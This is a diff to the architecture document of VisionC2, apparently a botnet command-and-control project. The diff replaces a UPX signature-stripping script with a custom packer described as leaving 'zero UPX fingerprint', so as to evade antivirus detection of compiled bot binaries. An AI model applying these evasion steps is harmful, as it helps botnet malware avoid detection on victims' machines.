@@ -729,8 +729,7 @@ VisionC2/
 │   ├── crypto.go         # Unified AES-128-CTR encrypt/decrypt/verify/resetconfig CLI tool
 │   ├── cleanup.sh        # Remove bot persistence artifacts from a Linux machine
 │   ├── fix_botkill.sh    # Server tuning (fd limits, TCP buffers, port 443)
-│   ├── deUPX.py          # UPX signature stripper
-│   └── upx              # Bundled UPX binary (Linux amd64)
+│   └── upx              # m30w packer (custom UPX fork, zero fingerprint)
 ├── bins/                 # Compiled bot binaries (output)
 └── Docs/
     ├── ARCHITECTURE.md   # This document
@@ -774,8 +773,7 @@ go build -trimpath -ldflags="-s -w -buildid=" -o <name> ./bot
 
 **Post-Build Processing:**
 1. **`strip --strip-all`** — Remove remaining symbols
-2. **UPX compression** (`--best --lzma`) via bundled `tools/upx` — Reduce binary size
-3. **`deUPX.py`** — Strip UPX signature strings to evade UPX detection heuristics
+2. **m30w packer** (`--best --lzma`) via bundled `tools/upx` — Compress with zero UPX fingerprint
 
 ### Setup Automation
 **`setup.py` — Interactive Setup Wizard:**
